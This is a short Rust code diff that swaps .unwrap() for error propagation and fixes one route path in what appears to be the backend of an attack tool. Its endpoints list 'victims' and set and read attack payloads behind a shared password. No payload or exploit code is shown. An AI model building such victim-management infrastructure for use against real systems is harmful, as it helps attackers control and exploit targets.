@@ -34,15 +34,14 @@ async fn list_victims(
     if payload.password == crate::SETTINGS.password {
         let resp = sqlx::query_as!(Victim, "SELECT name FROM cic_victims")
             .fetch_all(&data.db)
-            .await
-            .unwrap();
+            .await?;
         Ok(HttpResponse::Ok().json(resp))
     } else {
         Err(ServiceError::WrongPassword)
     }
 }
 
-#[my_codegen::post(path = "crate::V1_ROUTES.attack.read_response")]
+#[my_codegen::post(path = "crate::V1_ROUTES.attack.set_payload")]
 async fn set_payload(data: AppData, payload: web::Json<Payload>) -> ServiceResult<impl Responder> {
     if payload.password == crate::SETTINGS.password {
         sqlx::query!(
@@ -54,8 +53,7 @@ async fn set_payload(data: AppData, payload: web::Json<Payload>) -> ServiceResul
             &payload.payload,
         )
         .execute(&data.db)
-        .await
-        .unwrap();
+        .await?;
 
         let id = sqlx::query_as!(
             PayloadID,
@@ -69,8 +67,7 @@ async fn set_payload(data: AppData, payload: web::Json<Payload>) -> ServiceResul
             &payload.payload,
         )
         .fetch_one(&data.db)
-        .await
-        .unwrap();
+        .await?;
 
         Ok(HttpResponse::Ok().json(id))
     } else {
@@ -91,8 +88,7 @@ async fn read_response(
             &payload.id,
         )
         .fetch_one(&data.db)
-        .await
-        .unwrap();
+        .await?;
         Ok(HttpResponse::Ok().json(data))
     } else {
         Err(ServiceError::WrongPassword)
